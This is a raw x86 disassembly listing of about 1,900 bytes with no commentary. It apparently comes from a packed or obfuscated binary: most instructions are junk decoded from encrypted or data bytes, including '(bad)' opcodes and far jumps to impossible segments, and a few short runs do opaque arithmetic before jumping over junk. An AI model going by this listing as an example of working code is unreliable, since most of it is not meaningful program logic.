  40e977:	mov    al,BYTE PTR [ebx-0x401f6fbc]
  40e97d:	shr    BYTE PTR [ebp+edi*4-0x6e3748bd],1
  40e984:	jecxz  0x40e9a4
  40e986:	fxch   st(6)
  40e988:	dec    ebp
  40e989:	sti    
  40e98a:	sbb    BYTE PTR [eax-0x75],cl
  40e98d:	shr    al,1
  40e98f:	retf   0x5c99
  40e992:	cmp    edx,DWORD PTR [edi+esi*8+0x39]
  40e996:	rcr    DWORD PTR [edx+0x3a16d373],cl
  40e99c:	iret   
  40e99d:	xchg   edx,eax
  40e99e:	adc    BYTE PTR [ebx-0x60c25e90],ch
  40e9a4:	les    esi,FWORD PTR [ebx-0xb]
  40e9a7:	push   ss
  40e9a8:	clc    
  40e9a9:	aaa    
  40e9aa:	mov    cl,0xa7
  40e9ac:	lsl    ecx,WORD PTR [edx]
  40e9af:	(bad)  
  40e9b0:	les    ebp,FWORD PTR ds:0x789b2c9b
  40e9b6:	or     eax,0x358baf12
  40e9bb:	retf   0xc35a
  40e9be:	mov    ebp,DWORD PTR [ebp+esi*2-0xc]
  40e9c2:	pop    esp
  40e9c4:	daa    
  40e9c5:	test   DWORD PTR [esi+edx*4+0x244e810d],edi
  40e9cc:	mov    edi,0x62728d47
  40e9d1:	test   eax,0xcae62bf
  40e9d6:	or     BYTE PTR [ecx],ch
  40e9d8:	adc    BYTE PTR [ebp-0x2a],ch
  40e9db:	or     DWORD PTR [edx-0x359b0af1],esi
  40e9e1:	sti    
  40e9e2:	ins    BYTE PTR es:[edi],dx
  40e9e3:	lds    ecx,FWORD PTR cs:[edi-0x4f]
  40e9e7:	dec    ebx
  40e9e8:	add    bl,cl
  40e9ea:	scas   al,BYTE PTR es:[edi]
  40e9eb:	pop    edi
  40e9ec:	div    esp
  40e9ee:	and    BYTE PTR [ebx],dh
  40e9f0:	push   ss
  40e9f1:	call   0xcc54:0x42cc4040
  40e9f8:	iret   
  40e9f9:	xor    al,0x87
  40e9fb:	jle    0x40e9f1
  40e9fd:	xor    al,0xbf
  40e9ff:	dec    BYTE PTR [edi]
  40ea01:	or     bh,BYTE PTR [ebp-0x12eb28aa]
  40ea07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea08:	in     eax,dx
  40ea09:	shl    BYTE PTR [ecx],cl
  40ea0b:	aad    0xa4
  40ea0d:	mov    ebp,es
  40ea0f:	xchg   DWORD PTR [edx+eax*8+0x22526d9f],ecx
  40ea16:	cs (bad) 
  40ea18:	test   DWORD PTR [ebx+ebx*4],ebx
  40ea1b:	ffreep st(2)
  40ea1d:	pop    esi
  40ea1e:	pop    ebp
  40ea1f:	push   esi
  40ea20:	popa   
  40ea21:	mov    bh,0xec
  40ea23:	dec    edx
  40ea24:	add    dl,dh
  40ea26:	repz into 
  40ea28:	push   esp
  40ea29:	call   0x3bb8f19e
  40ea2e:	inc    edx
  40ea2f:	out    0x1f,eax
  40ea31:	pop    es
  40ea32:	into   
  40ea33:	xor    al,0xd2
  40ea35:	aaa    
  40ea36:	fiadd  DWORD PTR [ecx-0x2639a06f]
  40ea3c:	in     eax,0xb1
  40ea3e:	inc    ecx
  40ea3f:	std    
  40ea40:	dec    edx
  40ea41:	out    dx,eax
  40ea42:	mul    BYTE PTR [edx-0x6d]
  40ea45:	mov    eax,ds:0xae4e7efd
  40ea4a:	call   DWORD PTR [ebp+0x17]
  40ea4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea4e:	loop   0x40ea59
  40ea50:	loope  0x40ea78
  40ea52:	mov    cl,0xae
  40ea54:	jmp    0xf6553877
  40ea59:	xor    dh,BYTE PTR [ebx+0x7b]
  40ea5c:	sub    al,0xb1
  40ea5e:	rol    ah,1
  40ea60:	js     0x40ea70
  40ea62:	ss ret 0xb7ab
  40ea66:	mov    ds:0xfa45a42,al
  40ea6b:	int    0x2b
  40ea6d:	mov    bh,0x23
  40ea6f:	pop    eax
  40ea70:	shr    DWORD PTR ds:0xe2962371,0x9
  40ea77:	mov    cl,0xc6
  40ea79:	ins    BYTE PTR es:[edi],dx
  40ea7a:	aam    0x8a
  40ea7c:	and    esi,DWORD PTR [eax-0x7e11c2b3]
  40ea82:	xchg   BYTE PTR [edi+0x1ad7121f],ch
  40ea88:	push   edi
  40ea89:	rcr    DWORD PTR [ecx+0x5c2e1db6],cl
  40ea8f:	sahf   
  40ea90:	in     eax,dx
  40ea91:	or     bh,BYTE PTR [edi-0x5b]
  40ea94:	pushf  
  40ea95:	fimul  WORD PTR [esi+0x54557b9b]
  40ea9b:	adc    al,0xe
  40ea9d:	xchg   edi,eax
  40ea9e:	nop
  40ea9f:	call   0xd2749781
  40eaa4:	div    edi
  40eaa6:	mov    edx,DWORD PTR ds:0x422538
  40eaac:	mov    edx,DWORD PTR [edx+0x1d4]
  40eab2:	sub    edx,eax
  40eab4:	mov    eax,DWORD PTR [ebp+0x10]
  40eab7:	mov    al,BYTE PTR [esi+eax*1]
  40eaba:	mov    BYTE PTR [edx+ecx*1-0x1c12],al
  40eac1:	mov    eax,DWORD PTR [ebp-0x1c]
  40eac4:	mov    edx,DWORD PTR [ebp-0x18]
  40eac7:	imul   eax,edx
  40eaca:	mov    edx,DWORD PTR [ebp-0x14]
  40eacd:	imul   eax,eax,0x262b
  40ead3:	or     eax,edx
  40ead5:	mov    edx,DWORD PTR [ebp-0x10]
  40ead8:	or     eax,edx
  40eada:	xor    eax,0x59f6
  40eadf:	jmp    0x40eda3
  40eae4:	sub    BYTE PTR [edi-0x3c],0x71
  40eae8:	pushf  
  40eae9:	sbb    bl,BYTE PTR [edx]
  40eaeb:	pop    edx
  40eaec:	mov    ebp,0x1aa14b9
  40eaf1:	jg     0x40eafb
  40eaf3:	push   0xfffffffd
  40eaf5:	mov    eax,0x14d21818
  40eafa:	sbb    BYTE PTR [eax],bl
  40eafc:	fmulp  st(0),st
  40eafe:	retf   
  40eaff:	sub    BYTE PTR [edx-0x3d33173b],bh
  40eb05:	jno    0x40eab0
  40eb07:	jnp    0x40eb61
  40eb09:	push   ss
  40eb0a:	dec    bh
  40eb0c:	inc    edx
  40eb0d:	jae    0x40eb08
  40eb0f:	mov    eax,0x66e09dc3
  40eb14:	push   ss
  40eb15:	test   al,0x6e
  40eb17:	pushf  
  40eb18:	stos   DWORD PTR es:[edi],eax
  40eb19:	cmp    ch,0x21
  40eb1c:	scas   al,BYTE PTR es:[edi]
  40eb1d:	shl    DWORD PTR [ecx],0xb0
  40eb20:	adc    DWORD PTR [edx],esp
  40eb22:	mov    cl,0xa
  40eb24:	push   ebx
  40eb25:	les    edx,FWORD PTR [eax+eiz*8-0x73f071ba]
  40eb2c:	out    0xcb,eax
  40eb2e:	xchg   DWORD PTR [ebx],esi
  40eb30:	mov    ebp,DWORD PTR [esi]
  40eb32:	outs   dx,BYTE PTR ds:[esi]
  40eb33:	in     eax,0xbc
  40eb35:	pop    ebp
  40eb36:	dec    ebp
  40eb37:	mov    ecx,0xfb18c743
  40eb3c:	jecxz  0x40eb01
  40eb3e:	pop    esp
  40eb3f:	xchg   DWORD PTR [esi],eax
  40eb41:	stc    
  40eb42:	pop    esp
  40eb43:	push   ds
  40eb44:	or     ebp,0xd0b358cc
  40eb4a:	jmp    0x40eb48
  40eb4c:	pop    esi
  40eb4d:	rcl    BYTE PTR [edi],0xd9
  40eb50:	dec    ebx
  40eb51:	jmp    0xbf73:0xa7f064c0
  40eb58:	inc    edi
  40eb59:	pop    ss
  40eb5a:	sbb    BYTE PTR ds:0xd3e21406,bl
  40eb60:	inc    edi
  40eb61:	popa   
  40eb62:	bound  edx,QWORD PTR [edx-0x13cd9577]
  40eb68:	dec    esi
  40eb69:	inc    ebp
  40eb6a:	pop    ebx
  40eb6b:	pop    eax
  40eb6c:	outs   dx,DWORD PTR ds:[esi]
  40eb6d:	sbb    edx,DWORD PTR [ebx]
  40eb6f:	fcomp  QWORD PTR ss:[ebx]
  40eb72:	fcom   QWORD PTR [ebx]
  40eb74:	xchg   esi,eax
  40eb75:	outs   dx,BYTE PTR ds:[esi]
  40eb76:	mov    ds:0x29fded3c,al
  40eb7b:	lea    eax,[ecx]
  40eb7d:	mov    ds:0x3cce546b,eax
  40eb82:	fwait
  40eb83:	lods   eax,DWORD PTR ds:[esi]
  40eb84:	sbb    DWORD PTR [esi],0x47c7bf57
  40eb8a:	cld    
  40eb8b:	pop    edi
  40eb8c:	mov    edx,0x4c603deb
  40eb91:	dec    eax
  40eb92:	add    BYTE PTR [edx+edi*2+0x75d6e441],ch
  40eb99:	sti    
  40eb9a:	ds pop ss
  40eb9c:	mov    ds:0xcf310b39,eax
  40eba1:	cmc    
  40eba2:	ins    DWORD PTR es:[edi],dx
  40eba3:	(bad)  
  40eba4:	fstp   QWORD PTR [edx+edi*8+0x48d9c8a]
  40ebab:	xchg   edx,eax
  40ebac:	scas   al,BYTE PTR es:[edi]
  40ebad:	cmp    esi,DWORD PTR [ecx+0x50]
  40ebb0:	and    al,0x36
  40ebb2:	mov    ebx,0xbb9bc8e3
  40ebb7:	inc    edi
  40ebb8:	inc    edi
  40ebb9:	dec    edi
  40ebba:	pusha  
  40ebbb:	jg     0x40ec27
  40ebbd:	stc    
  40ebbe:	ret    
  40ebbf:	jne    0x40ec14
  40ebc1:	jge    0x40ebe2
  40ebc3:	je     0x40eba5
  40ebc5:	cmp    eax,0xfafb9082
  40ebca:	cmc    
  40ebcb:	popa   
  40ebcc:	jecxz  0x40ec32
  40ebce:	pop    ecx
  40ebcf:	jmp    0xc9eb07fc
  40ebd4:	xor    DWORD PTR [ecx],eax
  40ebd6:	jbe    0x40ebbf
  40ebd8:	pop    edx
  40ebd9:	inc    ebx
  40ebda:	sub    dh,ah
  40ebdc:	inc    edx
  40ebdd:	mov    ebp,0x98134ede
  40ebe2:	lods   eax,DWORD PTR ds:[esi]
  40ebe3:	nop
  40ebe4:	dec    ebx
  40ebe5:	ins    BYTE PTR es:[edi],dx
  40ebe6:	and    edx,DWORD PTR [ebx-0x5]
  40ebe9:	mov    esi,0x307d6acf
  40ebee:	pusha  
  40ebef:	push   ds
  40ebf0:	push   cs
  40ebf1:	mov    bl,0x56
  40ebf3:	dec    eax
  40ebf4:	ret    
  40ebf5:	jg     0x40eb86
  40ebf7:	sub    DWORD PTR [ecx-0x66],ecx
  40ebfa:	push   0x5aad13b3
  40ebff:	call   0x7ae1b479
  40ec04:	out    dx,eax
  40ec05:	das    
  40ec06:	sar    BYTE PTR [ebx+0x39],cl
  40ec09:	pop    es
  40ec0a:	jno    0x40ebb2
  40ec0c:	je     0x40ebc2
  40ec0e:	fdivp  st(7),st
  40ec10:	sub    ebx,DWORD PTR [ebx]
  40ec12:	adc    eax,0x2bc2be5f
  40ec17:	ret    
  40ec18:	inc    ecx
  40ec19:	mov    ds,edi
  40ec1b:	jecxz  0x40ebb0
  40ec1d:	in     eax,0x1c
  40ec1f:	pop    eax
  40ec20:	fsub   QWORD PTR [edx+0x5a]
  40ec23:	xor    eax,0x2e81d578
  40ec28:	jmp    0x40ebe3
  40ec2a:	ret    0xd38e
  40ec2d:	fisub  WORD PTR [eax+0x2c]
  40ec30:	jl     0x40ebba
  40ec32:	cmp    bl,dl
  40ec34:	int3   
  40ec35:	jns    0x40ec73
  40ec37:	mov    esp,0x89b35981
  40ec3c:	xchg   esi,eax
  40ec3d:	in     al,0x4b
  40ec3f:	sbb    ah,BYTE PTR [ebp-0x41]
  40ec42:	pop    ds
  40ec43:	frstor [ecx+0x723a36c0]
  40ec49:	ret    
  40ec4a:	add    ah,bh
  40ec4c:	test   bh,bl
  40ec4e:	and    eax,0x2858979f
  40ec53:	clc    
  40ec54:	shr    esi,cl
  40ec56:	add    al,0xf3
  40ec58:	into   
  40ec59:	fidiv  DWORD PTR [ebp-0x1b]
  40ec5c:	push   esp
  40ec5d:	pop    ds
  40ec5e:	and    al,0xaf
  40ec60:	mov    eax,ds:0xe5b28d39
  40ec65:	xlat   BYTE PTR ds:[ebx]
  40ec66:	or     DWORD PTR ds:0xf8f939bf,esp
  40ec6c:	pop    ds
  40ec6d:	cwde   
  40ec6e:	and    edi,esi
  40ec70:	push   0x84a9f158
  40ec75:	xor    cl,BYTE PTR [ecx+0x6c13dad6]
  40ec7b:	cmp    ebp,0x9a002cbe
  40ec81:	retf   
  40ec82:	or     BYTE PTR [ebp-0x22],dh
  40ec85:	or     DWORD PTR [eax+0x5b3555af],esp
  40ec8b:	aaa    
  40ec8c:	lahf   
  40ec8d:	test   BYTE PTR [esi*4+0x3f796e00],ah
  40ec94:	mov    ds:0x706b8b20,eax
  40ec99:	push   es
  40ec9a:	lahf   
  40ec9b:	aam    0x34
  40ec9d:	nop
  40ec9e:	mov    ecx,0x8dce2ceb
  40eca3:	xor    ah,dl
  40eca5:	xlat   BYTE PTR ds:[ebx]
  40eca6:	mov    eax,ds:0x21ea0925
  40ecab:	ins    BYTE PTR es:[edi],dx
  40ecac:	push   0xffffffcd
  40ecae:	mov    dl,bh
  40ecb0:	aam    0xd1
  40ecb2:	and    al,0x91
  40ecb4:	shl    ch,0x99
  40ecb7:	repz sub BYTE PTR [esi+0x19001c16],dh
  40ecbe:	or     DWORD PTR [ebx],eax
  40ecc0:	arpl   WORD PTR ds:0xa715b1c8,sp
  40ecc6:	aaa    
  40ecc7:	or     dh,0x10
  40ecca:	jns    0x40ece0
  40eccc:	and    BYTE PTR [edi],0x7f
  40eccf:	sahf   
  40ecd0:	call   esi
  40ecd2:	and    eax,0xdc487580
  40ecd7:	or     BYTE PTR [ebx+0x4c],al
  40ecda:	xor    esi,ebp
  40ecdc:	jb     0x40ec93
  40ecde:	push   0x1b5eb237
  40ece3:	mov    ebx,0x20a18dbf
  40ece8:	pusha  
  40ece9:	cwde   
  40ecea:	xor    BYTE PTR [edx-0x1af5382b],0x5b
  40ecf1:	add    edi,DWORD PTR [edx*4-0x49f9ce4c]
  40ecf8:	cmp    BYTE PTR [ebp-0x6185e4fa],al
  40ecfe:	call   0x6c67:0xd8cb6b09
  40ed05:	and    bl,BYTE PTR [edx-0x62b18524]
  40ed0b:	pusha  
  40ed0c:	xchg   BYTE PTR [eax],cl
  40ed0e:	cmc    
  40ed0f:	fidiv  DWORD PTR [ecx+0x3b9aaf82]
  40ed15:	push   eax
  40ed16:	or     BYTE PTR [esi+0x52d95018],0xcc
  40ed1d:	(bad)  
  40ed1e:	xchg   BYTE PTR ds:0xb0c19c80,cl
  40ed24:	jl     0x40ecd8
  40ed26:	mov    ebx,0x233753bb
  40ed2b:	push   0xffffffb8
  40ed2d:	cmp    al,0x65
  40ed2f:	jnp    0x40eda0
  40ed31:	stos   DWORD PTR es:[edi],eax
  40ed32:	scas   al,BYTE PTR es:[edi]
  40ed33:	retf   0xa1c5
  40ed36:	loopne 0x40ed96
  40ed38:	outs   dx,DWORD PTR ds:[esi]
  40ed39:	cmp    DWORD PTR [edi+0x40],0x78
  40ed3d:	mov    al,ds:0x8bce7683
  40ed42:	fnstcw WORD PTR [esi+0x3b069d27]
  40ed48:	and    dl,BYTE PTR [ebx+ebp*2-0x63]
  40ed4c:	jmp    0x2cfbb8d6
  40ed51:	and    BYTE PTR [ebp-0x1e],0x36
  40ed55:	leave  
  40ed56:	iret   
  40ed57:	or     BYTE PTR [edx],ch
  40ed59:	pop    edx
  40ed5a:	mov    ah,0x79
  40ed5c:	je     0x40ed48
  40ed5e:	push   esi
  40ed5f:	push   ecx
  40ed60:	mov    edx,DWORD PTR [edx]
  40ed62:	dec    ecx
  40ed63:	shl    BYTE PTR [ebp+eiz*1-0x29],0xaf
  40ed68:	push   ebx
  40ed69:	mov    ebx,0x5f85281e
  40ed6e:	out    0xdf,al
  40ed70:	icebp  
  40ed71:	lods   eax,DWORD PTR ds:[esi]
  40ed72:	stos   BYTE PTR es:[edi],al
  40ed73:	loope  0x40edbc
  40ed75:	xchg   esi,eax
  40ed76:	scas   eax,DWORD PTR es:[edi]
  40ed77:	loop   0x40ed69
  40ed79:	fild   DWORD PTR [ebx+0x46099215]
  40ed7f:	add    bl,BYTE PTR [ebx-0x7f]
  40ed82:	dec    edx
  40ed83:	sbb    al,0x10
  40ed85:	lahf   
  40ed86:	or     eax,0x5419269d
  40ed8b:	add    DWORD PTR [edi-0x2f],0x7d
  40ed8f:	lods   eax,DWORD PTR ds:[esi]
  40ed90:	and    eax,0x8fb6b152
  40ed95:	pop    ebp
  40ed96:	inc    ebp
  40ed97:	bound  ecx,QWORD PTR [edx]
  40ed99:	pop    edx
  40ed9a:	xchg   edi,eax
  40ed9b:	mov    esp,edi
  40ed9d:	pop    ebp
  40ed9e:	mov    bl,0xcf
  40eda0:	into   
  40eda1:	mov    bh,0xa0
  40eda3:	lea    ecx,[ecx+eax*1+0x350559e6]
  40edaa:	mov    eax,DWORD PTR [ebp-0xc]
  40edad:	and    eax,0xddc
  40edb2:	add    eax,DWORD PTR [ebp-0x8]
  40edb5:	xor    eax,0x46e3
  40edba:	add    eax,0x50eb
  40edbf:	cmp    ecx,eax
  40edc1:	jmp    0x40f085
  40edc6:	cmp    DWORD PTR [edx-0x25e5f4a4],ecx
  40edcc:	daa    
  40edcd:	sub    ch,BYTE PTR [edx-0x3155ed90]
  40edd3:	pop    ds
  40edd4:	cdq    
  40edd5:	mov    esp,0x1818b2b7
  40edda:	rcl    BYTE PTR [eax+ebx*1],cl
  40eddd:	sbb    BYTE PTR [ecx-0x5b20f5b7],ch
  40ede3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ede4:	sbb    al,0x81
  40ede6:	add    al,0x45
  40ede8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ede9:	cs loope 0x40edcd
  40edec:	jge    0x40ee2c
  40edee:	xchg   esp,eax
  40edef:	pop    ebx
  40edf0:	mov    dl,0x2c
  40edf2:	jmp    0x5be2b88d
  40edf7:	fstp   DWORD PTR [edi-0x680b7280]
  40edfd:	fdivr  st,st(4)
  40edff:	retf   
  40ee00:	rcr    DWORD PTR [eax-0x7be8396b],cl
  40ee06:	mov    eax,0xa0a7cb5c
  40ee0b:	les    ebp,FWORD PTR [edi+0x1a324924]
  40ee11:	sti    
  40ee12:	pop    ecx
  40ee13:	shr    DWORD PTR [edx*1+0x2a5a47c0],1
  40ee1a:	dec    esp
  40ee1b:	inc    ebp
  40ee1c:	arpl   WORD PTR [edx-0x134b18e3],bp
  40ee22:	lock daa 
  40ee24:	or     cl,bh
  40ee26:	loop   0x40ee65
  40ee28:	nop
  40ee29:	jp     0x40edd1
  40ee2b:	ins    BYTE PTR es:[edi],dx
  40ee2c:	repz mov ds:0xb2514765,al
  40ee32:	add    esp,0x40
  40ee35:	in     eax,dx
  40ee36:	inc    esp
  40ee37:	xor    cl,BYTE PTR [ebx]
  40ee39:	xchg   edi,eax
  40ee3a:	movntps XMMWORD PTR [esp+edi*4-0x1a2313c4],xmm2
  40ee42:	inc    ebp
  40ee43:	jecxz  0x40ee88
  40ee45:	fdivr  QWORD PTR [eax+0x22]
  40ee48:	mov    al,ds:0x5b47970
  40ee4d:	inc    esi
  40ee4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee4f:	sbb    DWORD PTR [ebx+0x573940ff],edx
  40ee55:	mov    ebp,DWORD PTR [ecx-0x51]
  40ee58:	xchg   DWORD PTR [eax+ecx*1-0x31364cbb],eax
  40ee5f:	push   esp
  40ee60:	pop    edi
  40ee61:	std    
  40ee62:	pop    eax
  40ee63:	dec    ecx
  40ee64:	or     al,0x85
  40ee66:	or     DWORD PTR [esi+0xb],0xffffffa7
  40ee6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee6b:	stos   BYTE PTR es:[edi],al
  40ee6c:	sahf   
  40ee6d:	mov    al,0x42
  40ee6f:	adc    bh,BYTE PTR [eax+0x4e85a332]
  40ee75:	lahf   
  40ee76:	lods   eax,DWORD PTR ds:[esi]
  40ee77:	pusha  
  40ee78:	mov    dh,0x87
  40ee7a:	lock fnsave [edi+0x2887781b]
  40ee81:	xchg   edx,eax
  40ee82:	mov    bl,0x10
  40ee84:	mov    bl,BYTE PTR [edx-0x6c]
  40ee87:	in     al,dx
  40ee88:	test   BYTE PTR [ebx+ebp*8+0x3282ad41],bh
  40ee8f:	mov    dl,0x5a
  40ee91:	add    edx,DWORD PTR [edi+0xe0e7e91]
  40ee97:	bound  eax,QWORD PTR [esi-0x78]
  40ee9a:	jle    0x40eebd
  40ee9c:	fst    DWORD PTR [ebp-0x798cc00e]
  40eea2:	popf   
  40eea3:	fcomi  st,st(7)
  40eea5:	jecxz  0x40ee83
  40eea7:	xchg   eax,edx
  40eea9:	and    eax,0xaf65cca
  40eeae:	push   ebp
  40eeaf:	(bad)  [eax+0x7cb15234]
  40eeb5:	jmp    0xc861e635
  40eeba:	stos   BYTE PTR es:[edi],al
  40eebb:	std    
  40eebc:	pop    esi
  40eebd:	addr16 call 0x19a43672
  40eec3:	es (bad) 
  40eec5:	ss inc eax
  40eec7:	mov    dl,0x3
  40eec9:	in     eax,dx
  40eeca:	clc    
  40eecb:	mov    esi,0xee165
  40eed0:	mov    esp,0x265f4555
  40eed5:	or     eax,0xe9cc2e3a
  40eeda:	push   edx
  40eedb:	rcr    DWORD PTR [ecx],1
  40eedd:	dec    esi
  40eede:	test   BYTE PTR [esi-0x5a],dl
  40eee1:	pop    ebp
  40eee2:	into   
  40eee3:	xchg   ebx,eax
  40eee4:	sbb    al,dh
  40eee6:	cwde   
  40eee7:	ja     0x40ee72
  40eee9:	jae    0x40eed2
  40eeeb:	inc    ebp
  40eeec:	jo     0x40eefc
  40eeee:	jo     0x40ef6d
  40eef0:	imul   esi,DWORD PTR [eax-0x2f],0x5209c335
  40eef7:	and    bl,BYTE PTR [ecx+0x603414da]
  40eefd:	sbb    ebx,DWORD PTR [ebp-0x53aa08d4]
  40ef03:	mov    BYTE PTR [ebx],cl
  40ef05:	mov    esi,?
  40ef07:	je     0x40ee91
  40ef09:	rcl    DWORD PTR [ebp-0x3f],cl
  40ef0c:	or     al,0x1a
  40ef0e:	jmp    0x5ec9adcb
  40ef13:	cwd    
  40ef15:	mov    edi,0x841189c2
  40ef1a:	and    eax,0xedb3b88
  40ef1f:	loopne 0x40ef62
  40ef21:	lds    ecx,FWORD PTR [ebp-0x3cc6c7e8]
  40ef27:	(bad)  
  40ef28:	aad    0x21
  40ef2a:	test   dh,cl
  40ef2c:	(bad)  
  40ef2d:	cwde   
  40ef2e:	push   es
  40ef2f:	dec    edx
  40ef30:	cmp    ebx,DWORD PTR [ebp+edi*1-0x38]
  40ef34:	mov    ds:0x354e404d,eax
  40ef39:	sbb    dl,BYTE PTR [ebx-0x5eb0398d]
  40ef3f:	inc    ebp
  40ef40:	cwde   
  40ef41:	popa   
  40ef42:	icebp  
  40ef43:	adc    edi,DWORD PTR [eax]
  40ef45:	mov    esp,0xe9466567
  40ef4a:	std    
  40ef4b:	xchg   ebp,eax
  40ef4c:	pop    edx
  40ef4d:	mov    edi,0x8e7eb02d
  40ef52:	outs   dx,BYTE PTR ds:[esi]
  40ef53:	xchg   edi,eax
  40ef54:	in     eax,0x86
  40ef56:	mov    al,ds:0xa882f692
  40ef5b:	pop    edi
  40ef5c:	xor    esi,DWORD PTR [ebp+eiz*4-0xf]
  40ef60:	mov    al,0x34
  40ef62:	mov    WORD PTR [ebp+0x2c],ss
  40ef65:	adc    bl,BYTE PTR [edi+0x549fa46b]
  40ef6b:	out    0x39,eax
  40ef6d:	mov    esp,ebp
  40ef6f:	mov    al,0xbc
  40ef71:	pop    ds
  40ef72:	fistp  DWORD PTR [ecx]
  40ef74:	adc    BYTE PTR [ebp-0x339bff95],dh
  40ef7a:	test   al,0x20
  40ef7c:	lods   al,BYTE PTR ds:[esi]
  40ef7d:	mov    dl,0x56
  40ef7f:	jns    0x40ef1c
  40ef81:	push   0x1c
  40ef83:	mov    ecx,0x8438c068
  40ef88:	sbb    esp,DWORD PTR [edx-0x40]
  40ef8b:	mov    bl,0x15
  40ef8d:	icebp  
  40ef8e:	xlat   BYTE PTR ds:[ebx]
  40ef8f:	xor    BYTE PTR [edi+0x6f],dh
  40ef92:	mov    ecx,0xc7e1a522
  40ef97:	mov    eax,ds:0x29e1e850
  40ef9c:	rcl    DWORD PTR [edx+0x86f992a],0x21
  40efa3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40efa4:	add    eax,0x91887594
  40efa9:	icebp  
  40efaa:	daa    
  40efab:	xor    DWORD PTR [edi+0x20],esi
  40efae:	je     0x40efb0
  40efb0:	fs mov esp,0xdec5714b
  40efb6:	mov    esp,0x386fe119
  40efbb:	push   cs
  40efbc:	cli    
  40efbd:	mov    esp,0xaa2d4bd2
  40efc2:	inc    esp
  40efc3:	lds    esi,FWORD PTR [edi]
  40efc5:	sbb    dh,ch
  40efc7:	pop    ecx
  40efc8:	push   eax
  40efc9:	out    dx,eax
  40efca:	mov    edx,0x6376a990
  40efcf:	les    edx,FWORD PTR [ebx+ebx*2+0x2a135935]
  40efd6:	mov    bl,0x52
  40efd8:	jbe    0x40efe5
  40efda:	adc    al,0x28
  40efdc:	mov    ch,bh
  40efde:	xor    edx,DWORD PTR [esi]
  40efe0:	xor    DWORD PTR [ecx],edi
  40efe2:	add    DWORD PTR [edi-0x73],0xffffffbc
  40efe6:	lahf   
  40efe7:	sub    dh,bh
  40efe9:	das    
  40efea:	jno    0x40efb3
  40efec:	setle  dh
  40efef:	mov    dh,BYTE PTR [ecx+eax*4+0x17]
  40eff3:	jbe    0x40f00a
  40eff5:	push   0x38
  40eff7:	jg     0x40f011
  40eff9:	cmp    dh,BYTE PTR [edi-0x3f5fec19]
  40efff:	lods   al,BYTE PTR ds:[esi]
  40f000:	jbe    0x40f060
  40f002:	or     DWORD PTR [ebx-0xf39adce],ecx
  40f008:	or     ch,BYTE PTR [edi+0x43]
  40f00b:	outs   dx,BYTE PTR ds:[esi]
  40f00c:	dec    ebp
  40f00d:	mov    edx,0x1b74b96d
  40f012:	mov    edi,0xaedc2c1b
  40f017:	das    
  40f018:	jne    0x40f04b
  40f01a:	test   BYTE PTR ds:0x32bc5b6b,0xee
  40f021:	dec    ecx
  40f022:	and    ch,BYTE PTR [ecx-0x70]
  40f025:	add    eax,0xa2ed8b16
  40f02a:	pop    esp
  40f02b:	adc    al,0xe
  40f02d:	jle    0x40f007
  40f02f:	push   esp
  40f030:	out    0x4d,al
  40f032:	sub    bl,BYTE PTR [edi]
  40f034:	push   esi
  40f035:	mov    ds:0xd8f3054c,al
  40f03a:	mov    ds:0x2b2c51c9,eax
  40f03f:	jge    0x40f09c
  40f041:	popf   
  40f042:	rcr    DWORD PTR [edx-0x6de5fc25],1
  40f048:	jle    0x40f08e
  40f04a:	(bad)  
  40f04b:	adc    BYTE PTR [ebx-0x7b98f960],ah
  40f051:	jmp    0x41:0x6bb48ce2
  40f058:	push   ecx
  40f059:	sub    BYTE PTR [esi+0x1f88b24b],bh
  40f05f:	test   al,0xb3
  40f061:	loope  0x40f0a9
  40f063:	ret    0x2bdc
  40f066:	call   0xed203826
  40f06b:	shr    DWORD PTR [ebx+0x1ee18bb1],1
  40f071:	and    edi,edi
  40f073:	sub    BYTE PTR [ebx-0x1d33b023],ch
  40f079:	inc    ecx
  40f07a:	sbb    al,0x7f
  40f07c:	hlt    
  40f07d:	mov    edi,?
  40f07f:	jb     0x40f04f
  40f081:	dec    edx
  40f082:	jmp    0xf708:0x850f96c1
  40f089:	(bad)  
  40f08a:	call   FWORD PTR [edi-0x17]
  40f08d:	mov    edi,0x47000002
  40f092:	mov    ds:0x305a70db,al
  40f097:	inc    edx
  40f098:	call   0xb105:0xaa146552
  40f09f:	in     al,dx
  40f0a0:	mov    esi,0x1818ae70
  40f0a5:	rcl    BYTE PTR [eax+ebx*1],cl
  40f0a8:	sbb    BYTE PTR [ecx],dl
  40f0aa:	sbb    DWORD PTR [ebp-0x8],0xfbcce7f9
  40f0b1:	mov    ch,0x19
  40f0b3:	adc    BYTE PTR [edi-0x51d6f49e],ah
  40f0b9:	cmp    BYTE PTR [ebx],dh
  40f0bb:	ret    
  40f0bc:	mov    ah,0x85
  40f0be:	cmp    eax,0xb186dbde
  40f0c3:	(bad)  
  40f0c4:	pop    ebp
  40f0c5:	push   ss
  40f0c6:	jns    0x40f0dc
  40f0c8:	vpsrlq xmm4,xmm0,XMMWORD PTR [edi]
  40f0cc:	push   ds
  40f0cd:	push   ss
  40f0ce:	ja     0x40f0da
  40f0d0:	push   esi
  40f0d1:	repnz mov BYTE PTR [ebx],dh
  40f0d4:	ins    DWORD PTR es:[edi],dx
  40f0d5:	ret    0x4b52
  40f0d8:	sti    
  40f0d9:	scas   eax,DWORD PTR es:[edi]
  40f0da:	in     al,dx
  40f0db:	dec    eax
  40f0dc:	cdq    
  40f0dd:	repz add BYTE PTR [edi+0x2c],0x5d
  40f0e2:	and    al,0xc6
  40f0e4:	sbb    eax,0x228897d
  40f0e9:	pop    ds
  40f0ea:	and    DWORD PTR [ebx],edi
  40f0ec:	sti    
  40f0ed:	sbb    ecx,ebx
  40f0ef:	xchg   ebx,eax
  40f0f0:	imul   ecx,DWORD PTR [ebx+0xe],0xeaf57958
  40f0f7:	jecxz  0x40f079
  40f0f9:	ret    
  40f0fa:	and    esp,DWORD PTR ds:0x77602919
  40f100:	stos   DWORD PTR es:[edi],eax
  40f101:	pop    ebp
  40f102:	mov    eax,ds:0xb21b0be6
  40f107:	mov    dl,0x4c
  40f109:	call   0x4e9f:0x4787a20c
  40f110:	adc    edx,DWORD PTR [ebp+eiz*2+0x718f7253]
  40f117:	add    BYTE PTR [ecx+0x19d79533],al
  40f11d:	mov    bh,0xd7
